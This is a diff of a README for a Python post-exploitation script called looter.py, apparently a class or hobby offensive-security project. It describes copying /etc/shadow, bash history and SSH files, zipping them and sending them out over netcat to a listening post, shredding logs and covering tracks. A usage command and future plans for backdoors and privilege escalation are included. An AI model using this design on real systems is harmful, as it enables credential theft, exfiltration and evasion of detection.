@@ -5,9 +5,9 @@ On the 842 Ideas Spreadsheet, Andrew Kramer suggested the idea of creating an au
 ##Purpose
 This script will crawl through a box and quickly collect useful information for an attacker.  The script will determine which OS it is on to ensure compatibility before attempting to collect anything.  The nest egg (collection stash) location will be in the present working directory of the script unless specified by the user.
 
-This script makes an attempt is made to copy relevant files including but not limited to /etc/passwd, /etc/shadow, ~/.bash_history, etc to the nest egg location.  Once everything is collected, the files are prepared and zipped for exfil.  Currently, the script uses netcat to create a network connection to a listening post for exfil.
+This script makes an attempt is made to copy relevant files including but not limited to /etc/passwd, /etc/shadow, ~/.bash_history, etc to the nest egg location.  Once everything is collected, the files are prepared and zipped for exfiltration.  Currently, the script uses netcat to create a network connection to a listening post for exfiltration.
 
-The goal is to be discreet and the script will shred logs, avoid writing to bash_history, and cover its own tracks.
+The goal is to be discreet and the script will shred logs, avoid writing to bash_history, and cover its own tracks after performing collections.
 
 This Python script has been tested on Kali Linux 64 bit with Python 2.7.12.
 
@@ -52,9 +52,19 @@ Specifying the -d flag with a valid path will change the default nest egg locati
 python ./looter.py -a -t 10.0.0.1 -p 1234 -d ~/Desktop/
 ```
 
-#Other
+#Known Issues
+* Clean up collection of ~/.ssh/ file (currently throws everything into single folder with everything else)
 
 #Future Work
+* Search ssh known_hosts file and attempt to log into entries
+* Dump any databases into a file
+* Run a quick internal network scan and output into a file
+
+##Long Term Goals
+* Attempt privilege escalation
+* Attempt to install a basic backdoor
+* Provide OS compatibility across OSX, Windows, and *nix
+
 
 #Resources
 https://pymotw.com/2/argparse/
